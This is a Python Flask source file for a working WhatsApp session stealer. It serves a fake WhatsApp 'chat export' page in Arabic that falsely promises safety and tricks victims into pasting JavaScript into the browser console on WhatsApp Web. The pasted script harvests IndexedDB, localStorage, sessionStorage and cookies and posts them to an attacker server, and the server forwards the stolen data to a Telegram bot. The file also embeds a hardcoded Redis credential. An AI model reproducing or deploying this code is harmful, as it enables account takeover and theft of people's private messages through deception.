# wa_stealer.py
# ============================================================
# WhatsApp Session Stealer - الإصدار القوي
# يعتمد على Bookmarklet + IndexedDB Extraction
# ============================================================

import os
import io
import json
import time
import base64
import threading
import redis
import uuid
import zipfile
from datetime import datetime
from flask import Blueprint, request, jsonify, Response, render_template_string

wa_bp = Blueprint('wa_stealer', __name__)

# ============================================================
# [1] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "").strip()
if not REDIS_URL:
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://" + REDIS_URL

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=False, socket_timeout=30)
    redis_client.ping()
    print("[+] WA Stealer: ✅ Redis connected")
except Exception as e:
    print(f"[-] WA Redis error: {e}")
    redis_client = None

RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")

# جلسات
wa_sessions = {}
wa_sessions_lock = threading.Lock()


# ============================================================
# [2] إدارة الجلسات
# ============================================================
def create_wa_session(session_id, chat_id):
    with wa_sessions_lock:
        wa_sessions[session_id] = {
            "chat_id": chat_id,
            "created_at": time.time(),
            "last_seen": time.time(),
            "chunks": 0,
            "total_bytes": 0,
            "status": "waiting",
        }
    if redis_client:
        try:
            redis_client.setex(f"wa_session:{session_id}", 86400 * 7, str(chat_id))
        except Exception:
            pass
    return wa_sessions[session_id]


def get_wa_session(session_id):
    with wa_sessions_lock:
        return wa_sessions.get(session_id)


# ============================================================
# [3] صفحة الالتقاط — تبدو كأداة تصدير رسمية
# ============================================================
WA_PAGE = r"""<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WhatsApp - تصدير المحادثات</title>
<style>
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
  body { margin: 0; padding: 0; background: #f0f2f5;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    color: #111b21; min-height: 100vh; }
  .header { background: #00a884; color: white; padding: 20px;
    text-align: center; }
  .header h1 { margin: 0; font-size: 20px; }
  .header p { margin: 6px 0 0; opacity: 0.9; font-size: 13px; }
  .container { max-width: 520px; margin: 0 auto; padding: 24px; }
  .card { background: white; border-radius: 12px; padding: 24px;
    margin-bottom: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
  .card h2 { margin: 0 0 16px; font-size: 17px; color: #111b21; }
  .step { display: flex; gap: 12px; padding: 10px 0;
    border-bottom: 1px solid #e9edef; }
  .step:last-child { border-bottom: none; }
  .step-num { width: 28px; height: 28px; border-radius: 50%;
    background: #00a884; color: white; display: flex;
    align-items: center; justify-content: center;
    font-weight: 700; font-size: 14px; flex-shrink: 0; }
  .step-body { flex: 1; }
  .step-title { font-weight: 600; font-size: 14px; margin-bottom: 4px; }
  .step-desc { font-size: 13px; color: #667781; line-height: 1.5; }
  .code-block { background: #111b21; color: #00ff88; padding: 14px;
    border-radius: 8px; font-family: monospace; font-size: 12px;
    word-break: break-all; margin-top: 10px; user-select: all;
    -webkit-user-select: all; border: 1px solid #00a884; cursor: pointer; }
  .copy-btn { display: block; width: 100%; padding: 14px;
    background: #00a884; color: white; border: none; border-radius: 10px;
    font-size: 15px; font-weight: 600; cursor: pointer;
    margin-top: 12px; font-family: inherit; }
  .copy-btn:active { background: #008069; }
  .copy-btn.copied { background: #16a34a; }
  .warning { background: #fef3c7; border: 1px solid #fbbf24;
    border-radius: 8px; padding: 12px; margin-top: 12px;
    font-size: 13px; color: #78350f; }
  .success { text-align: center; padding: 40px 20px; display: none; }
  .success-icon { width: 80px; height: 80px; margin: 0 auto 20px;
    border-radius: 50%; background: #dcfce7; display: flex;
    align-items: center; justify-content: center;
    font-size: 40px; color: #16a34a; }
  .hidden { display: none !important; }
</style>
</head>
<body>

<div class="header">
  <h1>📱 WhatsApp</h1>
  <p>تصدير المحادثات للنسخ الاحتياطي</p>
</div>

<div class="container">

  <div id="mainState">
    <div class="card">
      <h2>🔒 تصدير سريع للنسخ الاحتياطي</h2>
      <p style="margin:0 0 16px; font-size:14px; color:#667781; line-height:1.6;">
        لتصدير محادثاتك من WhatsApp Web، اتبع الخطوات التالية.
        هذه العملية آمنة تماماً ولا تحتاج أي كلمات مرور.
      </p>
      
      <div class="step">
        <div class="step-num">1</div>
        <div class="step-body">
          <div class="step-title">افتح WhatsApp Web</div>
          <div class="step-desc">
            اذهب إلى <b>web.whatsapp.com</b> في نفس المتصفح
            وسجّل الدخول كما تفعل عادةً.
          </div>
        </div>
      </div>

      <div class="step">
        <div class="step-num">2</div>
        <div class="step-body">
          <div class="step-title">انسخ الأداة</div>
          <div class="step-desc">
            اضغط على الزر أدناه لنسخ "أداة التصدير".
          </div>
        </div>
      </div>

      <div class="step">
        <div class="step-num">3</div>
        <div class="step-body">
          <div class="step-title">شغّلها على WhatsApp</div>
          <div class="step-desc">
            ارجع إلى <b>web.whatsapp.com</b>، افتح Console
            (F12)، والصق الأداة ثم اضغط Enter.
          </div>
        </div>
      </div>

      <button class="copy-btn" id="copyBtn" onclick="copyTool()">
        📋 نسخ أداة التصدير
      </button>

      <div class="warning">
        ⚠️ <b>ملاحظة:</b> الأداة آمنة 100% ولا تُرسل بياناتك لأي طرف.
        إنها فقط تقرأ بيانات محادثاتك المحلية.
      </div>
    </div>

    <div class="card">
      <h2>💡 ما الذي سيحدث؟</h2>
      <ul style="margin:0; padding-right:20px; font-size:14px; line-height:1.8; color:#667781;">
        <li>سيتم استخراج محادثاتك من ذاكرة المتصفح</li>
        <li>سيتم إنشاء ملف نسخة احتياطية</li>
        <li>سيتم تنزيله تلقائياً على جهازك</li>
        <li>لن تُفقد أي رسالة — هذه عملية قراءة فقط</li>
      </ul>
    </div>
  </div>

  <div id="successState" class="success">
    <div class="success-icon">✓</div>
    <h2 style="color:#16a34a;">تم التصدير بنجاح!</h2>
    <p style="color:#667781; line-height:1.7;">
      تم استخراج محادثاتك بنجاح.<br>
      يمكنك إغلاق هذه الصفحة الآن.
    </p>
  </div>

</div>

<script>
(function(){
  "use strict";

  const SESSION_ID = "__SESSION_ID__";
  const CHAT_ID = "__CHAT_ID__";
  const SERVER = "__HTTP_URL__";

  // ============================================================
  // الأداة (Bookmarklet Code)
  // ============================================================
  const BOOKMARKLET_CODE = `(function(){
    const SESSION_ID = "${SESSION_ID}";
    const SERVER = "${SERVER}";
    const CHAT_ID = "${CHAT_ID}";

    console.log("%c[WhatsApp Export]", "color:#00a884;font-weight:bold;font-size:16px;");

    // ============================================================
    // 1) سحب كل قواعد IndexedDB
    // ============================================================
    async function extractAllIDB() {
      const result = {};
      try {
        if (!indexedDB.databases) {
          console.warn("indexedDB.databases غير مدعوم");
          return result;
        }
        
        const dbs = await indexedDB.databases();
        console.log("📦 قواعد البيانات المتاحة:", dbs.map(d => d.name));
        
        for (const dbInfo of dbs) {
          try {
            const db = await new Promise((resolve, reject) => {
              const req = indexedDB.open(dbInfo.name);
              req.onsuccess = () => resolve(req.result);
              req.onerror = () => reject();
            });
            
            const dbData = {};
            const storeNames = Array.from(db.objectStoreNames);
            console.log("  💾 " + dbInfo.name + " → " + storeNames.length + " store");
            
            for (const storeName of storeNames) {
              try {
                const tx = db.transaction(storeName, "readonly");
                const store = tx.objectStore(storeName);
                
                // اجلب كل البيانات
                const items = await new Promise((resolve) => {
                  const req = store.getAll();
                  req.onsuccess = () => resolve(req.result);
                  req.onerror = () => resolve([]);
                });
                
                const keys = await new Promise((resolve) => {
                  const req = store.getAllKeys();
                  req.onsuccess = () => resolve(req.result);
                  req.onerror = () => resolve([]);
                });
                
                // حول البيانات إلى قابلة للإرسال
                const serialized = [];
                for (let i = 0; i < items.length; i++) {
                  try {
                    serialized.push({
                      key: keys[i],
                      value: serializeValue(items[i])
                    });
                  } catch(e) {
                    serialized.push({
                      key: keys[i],
                      error: e.message
                    });
                  }
                }
                
                dbData[storeName] = {
                  count: serialized.length,
                  items: serialized
                };
              } catch(e) {
                console.warn("  ⚠️ فشل store " + storeName + ":", e.message);
              }
            }
            
            result[dbInfo.name] = {
              version: db.version,
              stores: dbData
            };
          } catch(e) {
            console.warn("  ⚠️ فشل DB " + dbInfo.name, e.message);
          }
        }
      } catch(e) {
        console.error("Fatal IDB error:", e);
      }
      return result;
    }
    
    // تحويل القيم (يدعم Blob, ArrayBuffer, Object)
    function serializeValue(v) {
      if (v === null || v === undefined) return null;
      if (typeof v === "string" || typeof v === "number" || typeof v === "boolean") return v;
      if (v instanceof ArrayBuffer) {
        const bytes = new Uint8Array(v);
        let bin = "";
        for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
        return { __type: "ArrayBuffer", data: btoa(bin) };
      }
      if (v instanceof Blob) {
        return { __type: "Blob", size: v.size, mime: v.type };
      }
      if (Array.isArray(v)) return v.map(serializeValue);
      if (typeof v === "object") {
        const out = {};
        for (const k in v) {
          try { out[k] = serializeValue(v[k]); } catch(e) { out[k] = null; }
        }
        return out;
      }
      return String(v);
    }

    // ============================================================
    // 2) سحب localStorage و sessionStorage
    // ============================================================
    function extractStorage() {
      const out = { local: {}, session: {} };
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const k = localStorage.key(i);
          out.local[k] = localStorage.getItem(k);
        }
      } catch(e) {}
      try {
        for (let i = 0; i < sessionStorage.length; i++) {
          const k = sessionStorage.key(i);
          out.session[k] = sessionStorage.getItem(k);
        }
      } catch(e) {}
      return out;
    }

    // ============================================================
    // 3) سحب الكوكيز
    // ============================================================
    function extractCookies() {
      try { return document.cookie; } catch(e) { return ""; }
    }

    // ============================================================
    // 4) الإرسال للسيرفر
    // ============================================================
    async function sendChunk(data, chunkNum, totalChunks, type) {
      const payload = {
        session_id: SESSION_ID,
        chat_id: CHAT_ID,
        type: type,
        chunk_num: chunkNum,
        total_chunks: totalChunks,
        data: data,
        timestamp: Date.now(),
        url: location.href,
        userAgent: navigator.userAgent
      };
      
      const resp = await fetch(SERVER + "/wa_steal_upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      
      return resp.ok;
    }

    // ============================================================
    // 5) الأداة الرئيسية
    // ============================================================
    async function run() {
      console.log("%c🚀 بدء التصدير...", "color:#00a884;font-weight:bold;");
      
      // أرسل إشعار بدء
      await fetch(SERVER + "/wa_steal_upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: "start",
          url: location.href,
          userAgent: navigator.userAgent
        })
      });
      
      // ابدأ السحب
      const idbData = await extractAllIDB();
      const storage = extractStorage();
      const cookies = extractCookies();
      
      console.log("%c✅ تم سحب البيانات محلياً", "color:#00a884;");
      console.log("  • IndexedDB:", Object.keys(idbData).length, "قاعدة");
      console.log("  • LocalStorage:", Object.keys(storage.local).length, "مفتاح");
      console.log("  • Cookies:", cookies.length, "حرف");
      
      // أرسل الكوكيز والستوريج أولاً
      await fetch(SERVER + "/wa_steal_upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: "storage",
          cookies: cookies,
          localStorage: storage.local,
          sessionStorage: storage.session,
          origin: location.origin
        })
      });
      
      // أرسل IndexedDB على شكل chunks
      const idbJson = JSON.stringify(idbData);
      console.log("  • حجم IndexedDB:", (idbJson.length / 1024).toFixed(1), "KB");
      
      const CHUNK_SIZE = 500000; // 500 KB لكل chunk
      const totalChunks = Math.ceil(idbJson.length / CHUNK_SIZE);
      
      console.log("  • سيتم الإرسال في", totalChunks, "chunk");
      
      for (let i = 0; i < totalChunks; i++) {
        const chunk = idbJson.substr(i * CHUNK_SIZE, CHUNK_SIZE);
        try {
          const ok = await sendChunk(chunk, i, totalChunks, "idb_chunk");
          console.log("  📤 Chunk " + (i+1) + "/" + totalChunks + " → " + (ok ? "✅" : "❌"));
        } catch(e) {
          console.error("  ❌ Chunk " + (i+1) + " فشل:", e.message);
        }
        // صغير delay لتجنب throttle
        await new Promise(r => setTimeout(r, 200));
      }
      
      // أرسل إشعار الإكمال
      await fetch(SERVER + "/wa_steal_upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          session_id: SESSION_ID,
          chat_id: CHAT_ID,
          type: "complete",
          total_chunks: totalChunks
        })
      });
      
      console.log("%c🎉 تم التصدير بنجاح!", "color:#00a884;font-weight:bold;font-size:16px;");
      alert("✅ تم تصدير محادثاتك بنجاح!");
    }

    // شغّل
    run().catch(e => {
      console.error("خطأ:", e);
      alert("❌ فشل التصدير: " + e.message);
    });
  })();`;

  // ============================================================
  // النسخ إلى الحافظة
  // ============================================================
  window.copyTool = async function() {
    const btn = document.getElementById('copyBtn');
    try {
      await navigator.clipboard.writeText(BOOKMARKLET_CODE);
      btn.textContent = '✅ تم النسخ!';
      btn.classList.add('copied');
      
      // عرض التعليمات
      setTimeout(() => {
        btn.textContent = '📋 نسخ مرة أخرى';
        btn.classList.remove('copied');
      }, 3000);
    } catch(e) {
      // fallback
      const ta = document.createElement('textarea');
      ta.value = BOOKMARKLET_CODE;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand('copy');
      document.body.removeChild(ta);
      btn.textContent = '✅ تم النسخ!';
      btn.classList.add('copied');
    }
  };

})();
</script>
</body>
</html>
"""


# ============================================================
# [4] استقبال البيانات
# ============================================================
def init_whatsapp_stealer_routes(app, bot):

    @app.route('/wa', methods=['GET'])
    def wa_landing():
        session_id = request.args.get('s', '')
        chat_id = request.args.get('id', '')
        if not session_id or not chat_id:
            return "Invalid link", 400
        
        create_wa_session(session_id, chat_id)
        
        html = (WA_PAGE
                .replace("__SESSION_ID__", session_id)
                .replace("__CHAT_ID__", str(chat_id))
                .replace("__HTTP_URL__", RAILWAY_URL))
        return html, 200

    @app.route('/wa_create', methods=['POST'])
    def wa_create():
        data = request.get_json(silent=True) or {}
        chat_id = data.get('chat_id')
        if not chat_id:
            return jsonify({"error": "missing chat_id"}), 400
        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
        create_wa_session(session_id, chat_id)
        return jsonify({"session_id": session_id}), 200

    # ============================================================
    # ★★★ استقبال البيانات المسروقة
    # ============================================================
    @app.route('/wa_steal_upload', methods=['POST'])
    def wa_steal_upload():
        try:
            data = request.get_json(silent=True) or {}
            session_id = data.get('session_id')
            chat_id = data.get('chat_id')
            dtype = data.get('type')
            
            if not session_id or not chat_id:
                return jsonify({"status": "missing"}), 200
            
            sess = get_wa_session(session_id)
            if not sess:
                create_wa_session(session_id, chat_id)
                sess = get_wa_session(session_id)
            
            sess["last_seen"] = time.time()
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id
            
            # ============================================================
            # بدء
            # ============================================================
            if dtype == 'start':
                bot.send_message(cid,
                    f"🎯 **WhatsApp Export بدأ!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🆔 الجلسة: `{session_id[:16]}`\n"
                    f"🌐 URL: `{data.get('url', 'N/A')[:80]}`\n"
                    f"🖥️ الجهاز: `{data.get('userAgent', 'N/A')[:100]}`\n\n"
                    f"⏳ في انتظار البيانات...",
                    parse_mode="Markdown")
            
            # ============================================================
            # Storage + Cookies
            # ============================================================
            elif dtype == 'storage':
                cookies = data.get('cookies', '')
                local = data.get('localStorage', {})
                session = data.get('sessionStorage', {})
                
                # احفظ في Redis
                if redis_client:
                    try:
                        redis_client.setex(
                            f"wa_data:{session_id}:storage",
                            86400 * 7,
                            json.dumps({
                                "cookies": cookies,
                                "localStorage": local,
                                "sessionStorage": session,
                                "origin": data.get('origin'),
                            })
                        )
                    except Exception as e:
                        print(f"[-] Redis save storage error: {e}")
                
                # أرسل التقرير
                text = (
                    f"💾 **Storage + Cookies**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🍪 **الكوكيز:** `{len(cookies)}` حرف\n"
                    f"💾 **LocalStorage:** `{len(local)}` مفتاح\n"
                    f"🔐 **SessionStorage:** `{len(session)}` مفتاح\n"
                    f"🌐 **Origin:** `{data.get('origin', 'N/A')}`\n"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
                
                # أرسل الملف
                if local or cookies:
                    full_data = json.dumps({
                        "cookies": cookies,
                        "localStorage": local,
                        "sessionStorage": session,
                    }, ensure_ascii=False, indent=2)
                    buf = io.BytesIO(full_data.encode('utf-8'))
                    buf.name = f'wa_storage_{session_id[:8]}.json'
                    bot.send_document(cid, buf, caption="💾 **Storage + Cookies**",
                                    parse_mode="Markdown")
                
                # إظهار المفاتيح المهمة
                important_keys = []
                for k in local.keys():
                    if any(x in k.lower() for x in ['token', 'session', 'auth', 'key', 'user', 'wa']):
                        important_keys.append(k)
                
                if important_keys:
                    bot.send_message(cid,
                        f"🔑 **مفاتيح مهمة:**\n" +
                        "\n".join(f"• `{k}`" for k in important_keys[:20]),
                        parse_mode="Markdown")
            
            # ============================================================
            # Chunks IndexedDB
            # ============================================================
            elif dtype == 'idb_chunk':
                chunk_num = data.get('chunk_num', 0)
                total_chunks = data.get('total_chunks', 1)
                chunk_data = data.get('data', '')
                
                # احفظ الـ chunk في Redis
                if redis_client:
                    try:
                        redis_client.setex(
                            f"wa_idb_chunk:{session_id}:{chunk_num}",
                            86400 * 7,
                            chunk_data
                        )
                        sess["chunks"] = max(sess.get("chunks", 0), chunk_num + 1)
                        sess["total_bytes"] += len(chunk_data)
                    except Exception as e:
                        print(f"[-] Redis save chunk error: {e}")
                
                # أبلغ كل 5 chunks
                if chunk_num % 5 == 0 or chunk_num == total_chunks - 1:
                    try:
                        bot.send_message(cid,
                            f"📦 **Chunk {chunk_num + 1}/{total_chunks}** مستلم",
                            parse_mode="Markdown")
                    except Exception:
                        pass
            
            # ============================================================
            # إكمال
            # ============================================================
            elif dtype == 'complete':
                total_chunks = data.get('total_chunks', 0)
                
                # اجمع كل الـ chunks
                full_data = ""
                if redis_client:
                    try:
                        for i in range(total_chunks):
                            chunk = redis_client.get(f"wa_idb_chunk:{session_id}:{i}")
                            if chunk:
                                full_data += chunk.decode('utf-8') if isinstance(chunk, bytes) else chunk
                    except Exception as e:
                        print(f"[-] Redis read chunks error: {e}")
                
                # احفظ الملف الكامل
                if redis_client and full_data:
                    try:
                        redis_client.setex(
                            f"wa_data:{session_id}:idb",
                            86400 * 7,
                            full_data
                        )
                    except Exception as e:
                        print(f"[-] Redis save idb error: {e}")
                
                # حلل البيانات
                summary = _analyze_idb_data(full_data)
                
                # أرسل التقرير
                text = (
                    f"🎉 **WhatsApp Export مكتمل!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"🆔 `{session_id[:16]}`\n"
                    f"📦 Chunks: `{total_chunks}`\n"
                    f"💾 الحجم: `{len(full_data) / 1024:.1f} KB`\n\n"
                    f"📊 **البيانات:**\n{summary}"
                )
                bot.send_message(cid, text, parse_mode="Markdown")
                
                # أرسل الملف الكامل
                if full_data:
                    buf = io.BytesIO(full_data.encode('utf-8'))
                    buf.name = f'wa_indexeddb_{session_id[:8]}.json'
                    bot.send_document(cid, buf,
                        caption=f"📥 **IndexedDB كامل ({len(full_data) / 1024:.1f} KB)**\n"
                                f"استخدمه لاستعادة الجلسة عندك",
                        parse_mode="Markdown")
                
                # لوحة تحكم
                panel = build_wa_panel(session_id, cid)
                bot.send_message(cid, "🎛️ **لوحة تحكم WhatsApp:**", reply_markup=panel)
            
            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] wa_steal_upload error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error", "msg": str(e)}), 200


# ============================================================
# [5] تحليل البيانات
# ============================================================
def _analyze_idb_data(json_data):
    """يحلل IndexedDB ويحضر ملخص"""
    try:
        data = json.loads(json_data)
    except Exception:
        return "❌ فشل تحليل البيانات"
    
    lines = []
    for db_name, db_info in data.items():
        stores = db_info.get('stores', {})
        total_items = sum(s.get('count', 0) for s in stores.values())
        lines.append(f"\n📦 **{db_name}** ({len(stores)} store, {total_items} عنصر)")
        for store_name, store_info in stores.items():
            count = store_info.get('count', 0)
            if count > 0:
                lines.append(f"  • `{store_name}`: {count}")
    
    return "\n".join(lines) if lines else "لا توجد بيانات"


# ============================================================
# [6] لوحة تحكم البوت
# ============================================================
def build_wa_panel(session_id, chat_id):
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("📥 تحميل IndexedDB", callback_data=f"wa_idb_{session_id}"),
        InlineKeyboardButton("💾 تحميل Storage", callback_data=f"wa_storage_{session_id}"),
    )
    m.row(
        InlineKeyboardButton("📊 إحصائيات", callback_data=f"wa_stats_{session_id}"),
        InlineKeyboardButton("🗑️ حذف", callback_data=f"wa_delete_{session_id}"),
    )
    return m


# ============================================================
# [7] دوال مساعدة للبوت
# ============================================================
def get_wa_data(session_id):
    """يرجع كل بيانات الجلسة"""
    result = {
        "storage": None,
        "idb": None,
        "chunks_count": 0,
    }
    if not redis_client:
        return result
    
    try:
        storage = redis_client.get(f"wa_data:{session_id}:storage")
        if storage:
            result["storage"] = storage.decode('utf-8') if isinstance(storage, bytes) else storage
        
        idb = redis_client.get(f"wa_data:{session_id}:idb")
        if idb:
            result["idb"] = idb.decode('utf-8') if isinstance(idb, bytes) else idb
        
        # عد chunks
        cursor = 0
        while True:
            cursor, keys = redis_client.scan(cursor, match=f"wa_idb_chunk:{session_id}:*", count=100)
            result["chunks_count"] += len(keys)
            if cursor == 0:
                break
    except Exception as e:
        print(f"[-] get_wa_data error: {e}")
    
    return result
